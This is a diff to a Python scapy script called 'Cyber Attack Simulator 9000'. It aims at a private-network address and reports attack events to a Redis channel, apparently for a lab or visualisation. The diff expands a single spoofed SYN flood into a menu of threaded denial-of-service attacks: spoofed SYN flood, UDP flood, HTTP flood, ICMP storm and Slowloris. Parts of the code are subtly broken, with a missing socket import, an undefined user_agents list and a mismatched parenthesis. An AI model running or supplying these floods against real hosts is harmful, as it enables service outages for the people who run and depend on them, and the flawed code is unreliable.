@@ -1,29 +1,134 @@
+attack_node.py
+
+
+
+
 from scapy.all import *
 import random
 import json
 import redis
+import threading
+import time
+import sys
+import select
 
 r = redis.Redis(host='192.168.1.102', port=6379)
 
 class StealthAttack:
     def __init__(self):
         self.target = '192.168.1.101'
+        self.running = False
+        self.attack_thread = None
         self.ports = [80, 443, 8080]
-    
-    def polymorphic_flood(self):
-        for _ in range(10000):
+        self.attack_types = {
+            1: "SYN Flood",
+            2: "UDP Flood",
+            3: "HTTP Flood",
+            4: "ICMP Storm",
+            5: "Slowloris",
+            6: "Exit"
+        }
+
+    def show_menu(self):
+        print("\n=== Cyber Attack Simulator 9000 ===")
+        for key in self.attack_types:
+            print(f"{key}. {self.attack_types[key]}")
+        choice = input("Select attack type: ")
+        return int(choice)
+
+    def send_attack_event(self, attack_type):
+        r.publish('network_events', json.dumps({
+            'type': 'attack_start',
+            'attack_type': attack_type,
+            'source': 104,
+            'target': 101,
+            'intensity': 0.95
+        }))
+
+    def send_stop_event(self):
+        r.publish('network_events', json.dumps({
+            'type': 'attack_stop',
+            'source': 104
+        }))
+
+    def syn_flood(self):
+        while self.running:
             src_ip = f"10.0.2.{random.randint(1, 254)}"
             sport = random.randint(1024, 65535)
             dport = random.choice(self.ports)
-            packet = IP(src=src_ip, dst=self.target)/TCP(sport=sport, dport=dport, flags="S")
-            send(packet, verbose=0)
-            r.publish('network_events', json.dumps({
-                'type': 'attack_pulse',
-                'source': 104,
-                'target': 101,
-                'intensity': 0.95
-            }))
+            send(IP(src=src_ip, dst=self.target)/TCP(sport=sport, dport=dport, flags="S"), verbose=0)
+            time.sleep(0.001)
+
+    def udp_flood(self):
+        while self.running:
+            payload = random._urandom(random.randint(64, 1024))
+            send(IP(src=RandIP())/UDP(sport=RandShort(), dport=random.choice(self.ports))/payload, verbose=0)
+
+    def http_flood(self):
+        while self.running:
+            get_str = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(self.target)
+            send(IP(dst=self.target)/TCP(dport=80, flags="S")/get_str, verbose=0)
+            time.sleep(0.01)
+
+    def icmp_storm(self):
+        while self.running:
+            send(IP(src=RandIP(), dst=self.target)/ICMP()/("X"*random.randint(64, 256)), verbose=0)
+
+    def slowloris(self):
+        sockets = []
+        while self.running and len(sockets) < 1000:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(4)
+                s.connect((self.target, 80))
+                s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode())
+                s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode())
+                s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5")).encode())
+                sockets.append(s)
+            except Exception:
+                break
+            time.sleep(0.1)
+
+    def start_attack(self, choice):
+        self.running = True
+        attack_name = self.attack_types[choice]
+        print(f"\n[!] Starting {attack_name} attack... (Press Enter to stop)")
+        self.send_attack_event(attack_name)
+        
+        attack_methods = {
+            1: self.syn_flood,
+            2: self.udp_flood,
+            3: self.http_flood,
+            4: self.icmp_storm,
+            5: self.slowloris
+        }
+        
+        self.attack_thread = threading.Thread(target=attack_methods[choice])
+        self.attack_thread.start()
+
+    def stop_attack(self):
+        if self.running:
+            self.running = False
+            self.attack_thread.join()
+            self.send_stop_event()
+            print("\n[!] Attack stopped")
+
+    def run(self):
+        while True:
+            choice = self.show_menu()
+            if choice == 6:
+                self.stop_attack()
+                sys.exit(0)
+            elif choice in self.attack_types:
+                self.stop_attack()  # Stop any existing attack
+                self.start_attack(choice)
+                
+                # Wait for Enter press to stop
+                input()
+                self.stop_attack()
+            else:
+                print("Invalid option!")
 
 if __name__ == '__main__':
     attack = StealthAttack()
-    attack.polymorphic_flood()
+    attack.run()
